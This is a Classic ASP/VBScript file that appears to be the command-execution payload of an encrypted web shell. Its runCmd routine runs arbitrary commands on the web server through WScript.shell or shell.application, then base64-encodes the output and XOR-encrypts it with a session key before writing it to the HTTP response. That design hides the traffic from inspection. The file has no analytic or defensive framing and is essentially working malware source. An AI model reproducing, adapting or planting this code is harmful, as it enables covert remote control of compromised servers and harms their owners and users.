Dim message
Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))
Next
Encrypt=encryptResult
End Function

Function Base64Encode(sText)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function GetStream()
	Set GetStream=CreateObject("Adodb.Stream")
End Function
Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=server.CreateObject(Key)
	Set GetFso=Fso
End Function

Sub runCmd(cmdPath,sexit,cmd)
on error resume Next
Dim ws,sa
Set ws=server.createobject("WScript.shell")
If IsEmpty(ws) Then
Set ws=server.createobject("WScript.shell.1")
End If
If IsEmpty(ws) Then
Set sa=server.createobject("shell.application")
End If
If IsEmpty(ws) And IsEmpty(sa) Then
Set sa=server.createobject("shell.application.1")
End If
dcmd=""
If sexit="true" Then
dcmd=cmdPath&" /c "&cmd
End IF
If Not IsEmpty(ws) Then
	Set process=ws.exec(dcmd)
	cmdResult=process.stdout.readall
	cmdResult=cmdResult&process.stderr.readall
	If Err Then 
		cmdResult=Err.Description
	End If
End If

If Not IsEmpty(sa) Then
	sa.ShellExecute ""&cmdPath,""&cmd,"","open",0
	cmdResult="shell.application Run OK,But Can't Response Cmd"
End If
finalResult=Base64Encode(cmdResult)
Response.binarywrite(Encrypt(finalResult))
End Sub

Sub main(cmdPath,sexit,cmd)
call runCmd(cmdPath,sexit,cmd)
End Sub